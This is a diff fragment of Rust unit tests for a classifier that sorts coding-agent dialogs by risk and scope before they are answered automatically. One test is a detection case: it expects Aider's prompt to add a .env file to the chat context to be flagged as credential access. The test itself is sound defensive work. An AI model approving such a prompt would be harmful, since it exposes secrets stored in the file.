+        let mut d_unk_2 = test_dialog(None, &[], &[]);
+        d_unk_2.question = "Should we target Postgres or SQLite?".to_string();
+        let c_unk_2 = classify_dialog(&d_unk_2, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_unk_2.class, DialogClass::Unknown);
+        assert!(!c_unk_2.repo_scoped);
+    }
+
+    #[test]
+    fn opencode_dialogs_classify_hold_safe_pending_live_fixtures() {
+        let scope = test_scope();
+
+        let pane_opencode =
+            "Which model would you like to switch to?\n> 1. claude-3-7-sonnet\n  2. gpt-4o";
+        let d1 = crate::agent::prompt::detect_dialog(pane_opencode).expect("opencode dialog");
+        let c1 = classify_dialog(&d1, AgentKind::OpenCode, &scope);
+        assert_eq!(c1.class, DialogClass::Unknown);
+        assert!(!c1.repo_scoped);
+
+        let pane_aider = "Add .env to the chat context?\n> 1. Yes\n  2. No";
+        let d2 = crate::agent::prompt::detect_dialog(pane_aider).expect("aider dialog");
+        let c2 = classify_dialog(&d2, AgentKind::Aider, &scope);
+        assert_eq!(c2.class, DialogClass::CredentialAccess);
+        assert!(!c2.repo_scoped);
+    }
+}
